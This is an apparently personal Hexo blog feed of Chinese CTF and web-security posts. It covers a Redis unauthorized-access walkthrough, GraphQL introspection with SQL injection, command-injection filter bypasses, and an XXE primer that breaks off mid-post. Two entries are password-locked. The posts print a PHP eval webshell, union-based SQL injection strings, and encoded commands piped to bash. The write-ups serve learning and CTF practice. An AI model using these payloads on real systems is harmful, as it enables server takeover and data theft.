<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-24T11:35:50.297Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>虎符网络安全大赛复盘</title>
    <link href="http://yoursite.com/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <id>http://yoursite.com/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
    <published>2020-04-19T11:19:54.000Z</published>
    <updated>2020-04-24T11:35:50.297Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="52b3a8a8bc1f9a2e16d623e56c141f939e5bc1c77e2a3764508eb978c434b792"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞复现与利用</title>
    <link href="http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-18T03:50:17.000Z</published>
    <updated>2020-04-18T04:07:25.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-漏洞简介以及危害"><a href="#0x-01-漏洞简介以及危害" class="headerlink" title="0x 01 漏洞简介以及危害"></a>0x 01 漏洞简介以及危害</h3><ul><li>漏洞简介</li></ul><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><h3 id="0x-02-漏洞复现"><a href="#0x-02-漏洞复现" class="headerlink" title="0x 02 漏洞复现"></a>0x 02 漏洞复现</h3><p>参考这篇文章搭建复现环境：<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">10.Redis未授权访问漏洞复现与利用</a></p><p>攻击机ip地址：192.168.194.132（本机虚拟机）</p><p>靶机IP地址：47.96.150.181（公网服务器）</p><h3 id="0x-03-未授权访问漏洞测试"><a href="#0x-03-未授权访问漏洞测试" class="headerlink" title="0x 03 未授权访问漏洞测试"></a>0x 03 未授权访问漏洞测试</h3><ul><li>验证漏洞存在</li></ul><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418115921434.png" alt></p><h4 id="3-1-利用redis写webshell"><a href="#3-1-利用redis写webshell" class="headerlink" title="3.1 利用redis写webshell"></a>3.1 利用redis写webshell</h4><p>利用前提：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</span><br></pre></td></tr></table></figure><p>我们尝试把shell写入/var/www/html目录下：</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120207512.png" alt></p><p>靶机查看是否写入成功</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120256926.png" alt></p><p>成功写入shell。</p><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);</span><br><span class="line">fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-利用”公私钥”认证获取root权限"><a href="#3-2-利用”公私钥”认证获取root权限" class="headerlink" title="3.2 利用”公私钥”认证获取root权限"></a>3.2 利用”公私钥”认证获取root权限</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-漏洞简介以及危害&quot;&gt;&lt;a href=&quot;#0x-01-漏洞简介以及危害&quot; class=&quot;headerlink&quot; title=&quot;0x 01 漏洞简介以及危害&quot;&gt;&lt;/a&gt;0x 01 漏洞简介以及危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;漏洞简介&lt;/li&gt;
&lt;/ul&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>当CTF遇上GraphQL的那些事</title>
    <link href="http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2020-04-14T06:17:45.000Z</published>
    <updated>2020-04-15T17:03:16.694Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CTF比赛中虽然遇到的不多，但偶尔也会碰到，在碰到GraphQL的题目时候该如何解决呢？于是就有了这一篇文章。</p><h3 id="0x-02-认识GraphQL"><a href="#0x-02-认识GraphQL" class="headerlink" title="0x 02 认识GraphQL"></a>0x 02 认识GraphQL</h3><p>​        那么什么是GraphQL呢？GraphQL是由Facebook创造并开源的一种用于API的查询语言。看到QL这样的字眼，很容易产生误解，以为是新的数据库查询语言，但其实GraphQL和数据库没有什么太大关系，GraphQL并不直接操作查询数据库，可以理解为传统的后端代码与数据库之间又多加了一层，这一层就是GraphQL。</p><p>想快速入门GraphQL的相关用法可以参考这一篇文章<a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">30分钟理解GraphQL核心概念</a></p><p>我们这里重点关注一下Resolver（解析函数）的工作流程，假设我们定义了以下的查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Query &#123;</span><br><span class="line">  articles &#123;</span><br><span class="line">       id</span><br><span class="line">       author &#123;</span><br><span class="line">           name</span><br><span class="line">       &#125;</span><br><span class="line">       comments &#123;</span><br><span class="line">      id</span><br><span class="line">      desc</span><br><span class="line">      author</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GraphQL在解析这段查询语句时会按如下步骤进行解析：</p><ul><li>首先进行第一层解析，当前<code>Query</code>的<code>Root Query</code>类型是<code>query</code>，同时需要它的名字是<code>articles</code></li><li>之后会尝试使用<code>articles</code>的<code>Resolver</code>获取解析数据，第一层解析完毕</li><li>之后对第一层解析的返回值，进行第二层解析，当前<code>articles</code>还包含三个子<code>Query</code>，分别是<code>id</code>、<code>author</code>和<code>comments</code><ul><li>id在Author类型中为标量类型，解析结束</li><li>author在Author类型中为对象类型User，尝试使用<code>User</code>的<code>Resolver</code>获取数据，当前field解析完毕</li><li>之后对第二层解析的返回值，进行第三层解析，当前<code>author</code>还包含一个<code>Query</code>, <code>name</code>，由于它是标量类型，解析结束</li><li>comments同上…</li></ul></li></ul><p>​        总结来说，GraphQL大体的解析流程就是遇到一个Query之后，尝试使用它的Resolver取值，之后再对返回值进行解析，这个过程是递归的，直到所解析Field的类型是<code>Scalar Type（标量类型）</code>为止。解析的整个过程我们可以把它想象成一个很长的Resolver Chain（解析链）。GraphQL大体的解析流程很像是遍历树结构，那么他的返回值也是类<em>树</em>结构展示的。</p><p>​        对于发送数据我们可以使用postman或者GraphiQL，相对于burp suit，数据结构会更加直观一些。</p><h3 id="0x-03-常用payload"><a href="#0x-03-常用payload" class="headerlink" title="0x 03 常用payload"></a>0x 03 常用payload</h3><p>​    在对GraphQL测试之前我们要知道只有代码里写了接口，定义了相应的schema，才能通过GraphQL查询出对应结果，所以并不是通过GraphQL就能查询获取数据库中的所有数据。</p><p>​    由于GraphQL自带强大的内省自检机制，可以直接获取后端定义的所有接口信息，常常存在信息泄露问题。那么我们可以通过<code>__schema</code>查询所有可用对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __schema &#123;</span><br><span class="line">        types &#123;</span><br><span class="line">            name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>__type</code>查询指定对象的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __type(name: &quot;User&quot;) &#123;</span><br><span class="line">        name</span><br><span class="line">        fields &#123;</span><br><span class="line">            name</span><br><span class="line">            type &#123;</span><br><span class="line">                name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时目标网站可能存在几十个对象，一个一个查找出具体的字段显示是太麻烦了，那么通过这两个payload可以获取所有对象和字段</p><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description args&#123;...InputValue&#125;onOperation onFragment onField&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体原理是通过<strong>IntrospectionQuery</strong>，返回包含足够多的信息的结果。</p><p>另外这篇文章里面*[GraphQL injection](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection)*也提供了一些payload可供使用</p><ul><li>常用工具：</li></ul><p><a href="https://github.com/swisskyrepo/GraphQLmap" target="_blank" rel="noopener">https://github.com/swisskyrepo/GraphQLmap</a></p><h3 id="0x-04-例题分析："><a href="#0x-04-例题分析：" class="headerlink" title="0x 04 例题分析："></a>0x 04 例题分析：</h3><p>这里以HITCTF2018 BabyQuery为例，题目的复现环境可以在github上找到：<a href="https://github.com/JohnHubcr/HITCTF2018/tree/master/web/BabyQuery" target="_blank" rel="noopener">HITCTF2018 BabyQuery</a></p><p>题目打开有一个点击查询成绩的按钮，点击会弹窗显示成绩，右键源代码可以发现一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">            var query_data &#x3D; &#123;&#39;query&#39;: &#39;&#123; getscorebyid(id: &quot;GE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)&#123; id name score &#125; &#125;&#39;&#125;</span><br><span class="line">            var btn &#x3D; $(&#39;#query&#39;);</span><br><span class="line">            btn.click(function()&#123;</span><br><span class="line">                $.post(&#39;&#x2F;graphql&#39;, query_data, function(result)&#123;</span><br><span class="line">                    alert(result);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>根据graphql可知后端使用了graphql查询api，我们使用上文中的payload，查看schema发现Query 操作有两个field: getscorebyyourname和getscorebyid 参数分别是name和id, 通过手工测试发现id参数经过base32编码且仅能是1位数, 而name参数存在SQL注入，那么可以构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;</span><br><span class="line">&#123;  getscorebyyourname(name:&quot;xxxx&quot;)</span><br><span class="line">&#123;</span><br><span class="line">score</span><br><span class="line">name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>name参数的值用我们构造SQL注入语句的经过base32编码后的结果替换。</p><p>首先是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select sqlite_version()-- </span><br><span class="line">&#x2F;&#x2F;查询出版本号:3.11.0,那么可以判断数据库为sqlite3</span><br><span class="line">1&#39; union select (select group_concat(name,0x3a) from sqlite_master)-- </span><br><span class="line">&#x2F;&#x2F;得到users和Secr3t_fl4g</span><br><span class="line">1&#39; union select (select flag from Secr3t_fl4g)-- </span><br><span class="line">&#x2F;&#x2F;得到flag：HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20200416004911642.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1528799" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1528799</a></p><p><a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014131950</a></p><p><a href="https://blog.csdn.net/qq_41882147/article/details/82966783" target="_blank" rel="noopener">https://blog.csdn.net/qq_41882147/article/details/82966783</a></p><p><a href="https://www.anquanke.com/post/id/156930" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156930</a></p><p><a href="https://www.anquanke.com/post/id/147455" target="_blank" rel="noopener">https://www.anquanke.com/post/id/147455</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CT
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>出题笔记（一）</title>
    <link href="http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-04-11T07:46:00.000Z</published>
    <updated>2020-04-12T08:53:43.243Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0f5575875875b2be4fc9ff7ef7fba887d8681309c2a915bec81e81cdff6b09fd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="出题笔记" scheme="http://yoursite.com/categories/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="出题" scheme="http://yoursite.com/tags/%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>常见的漏洞扫描工具使用总结</title>
    <link href="http://yoursite.com/2020/04/07/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/07/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-07T15:55:42.000Z</published>
    <updated>2020-04-07T15:56:22.515Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">https://github.com/chaitin/xray</a></p><p>nesuc</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/chaitin/xray&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/chaitin/xray&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;nesuc&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>命令执行tricks</title>
    <link href="http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    <id>http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/</id>
    <published>2020-04-07T08:42:11.000Z</published>
    <updated>2020-04-07T13:15:27.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-命令联合执行"><a href="#0x-01-命令联合执行" class="headerlink" title="0x 01 命令联合执行"></a>0x 01 命令联合执行</h3><p>常用的命令分隔符：</p><ul><li>; </li><li>&amp;&amp; </li><li>|| </li><li>%0a </li><li>%0d </li><li>| (管道符)  </li></ul><h3 id="0x-02-bypass技巧"><a href="#0x-02-bypass技巧" class="headerlink" title="0x 02 bypass技巧"></a>0x 02 bypass技巧</h3><p><strong>空格过滤</strong></p><ul><li>$IFS</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;</li><li>&lt;&gt;</li><li>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</li><li>%20</li><li>%09 </li></ul><p><strong>关键字黑名单绕过</strong></p><ul><li><p>ca\t flag\g.php    反斜线绕过</p></li><li><p>cat fl”ag.php     两个单引号绕过</p></li><li><p>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash    base64编码绕过(引号可以去掉)</p></li><li><p>echo “63617420666C61672E706870” | xxd -r -p | bash    hex编码绕过(引号可以去掉)</p></li><li><p>cat fl[a]g.php    用<code>[]</code>匹配</p></li><li><p>cat fla*    用<code>*</code>匹配任意</p></li><li><p>内联执行</p><p>所谓内联执行，就是将反引号内命令的输出作为另一个命令的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x-03-查看文件内容的常见命令"><a href="#0x-03-查看文件内容的常见命令" class="headerlink" title="0x 03 查看文件内容的常见命令"></a>0x 03 查看文件内容的常见命令</h3><p>参考这篇文章：<a href="https://blog.csdn.net/x7418520/article/details/81064861" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81064861</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat     由第一行开始显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">tac     从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line"></span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line"></span><br><span class="line">head    只显示头几行</span><br><span class="line"></span><br><span class="line">tail    只显示最后几行</span><br><span class="line"></span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line"></span><br><span class="line">tailf   类似于tail -f </span><br><span class="line">cut -b 1 flag      &#x2F;&#x2F;-b 可以逐位读取。</span><br><span class="line">a&#x3D;&#96;expr substr $PATH 1 1&#96;;b&#x3D;fla;c&#x3D;g.php;d&#x3D;ca;e&#x3D;t;$d$e ..$a$b$c;</span><br><span class="line">&#x2F;&#x2F; 利用环境变量来获取&#x2F;： expr substr $PATH 1 1 &#x3D;&gt;&#x2F;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1799.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-命令联合执行&quot;&gt;&lt;a href=&quot;#0x-01-命令联合执行&quot; class=&quot;headerlink&quot; title=&quot;0x 01 命令联合执行&quot;&gt;&lt;/a&gt;0x 01 命令联合执行&lt;/h3&gt;&lt;p&gt;常用的命令分隔符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;; &lt;/li&gt;
      
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="命令执行tricks" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞总结</title>
    <link href="http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-07T07:25:13.000Z</published>
    <updated>2020-04-07T08:38:38.715Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><p><strong>XML基础知识</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><h3 id="XML语法规则如下："><a href="#XML语法规则如下：" class="headerlink" title="XML语法规则如下："></a>XML语法规则如下：</h3><ol><li><strong>所有的XML元素都必须有一个关闭标签</strong></li><li><strong>XML标签对大小写敏感</strong></li><li><strong>XML必须正确嵌套</strong></li><li><strong>XML属性值必须加引号””</strong></li><li><strong>实体引用</strong>（在标签属性，以及对应的位置值可能会出现&lt;&gt;符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如&lt;傅好对应的实体就是lt，&gt;符号对应的实体就是gt）</li><li>在XML中，空格会被保留（案例如：<p>a空格B</p>，这时候a和B之间的空格就会被保留）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &#x2F;&#x2F;xml声明</span><br><span class="line">&lt;!DOCTYPE copyright [        &#x2F;&#x2F;DTD(文档类型定义)</span><br><span class="line">&lt;!ELEMENT note (to,reset,login)&gt;   &#x2F;&#x2F;定义元素</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;url&quot;&gt;        &#x2F;&#x2F;定义外部实体test</span><br><span class="line">]&gt;</span><br><span class="line">&lt;to&gt;</span><br><span class="line">&lt;reset&gt;                    &#x2F;&#x2F;下面为文档元素</span><br><span class="line">  &lt;login&gt;&amp;test;&lt;&#x2F;login&gt;            &#x2F;&#x2F;调用test实体（此步骤不可缺）</span><br><span class="line">  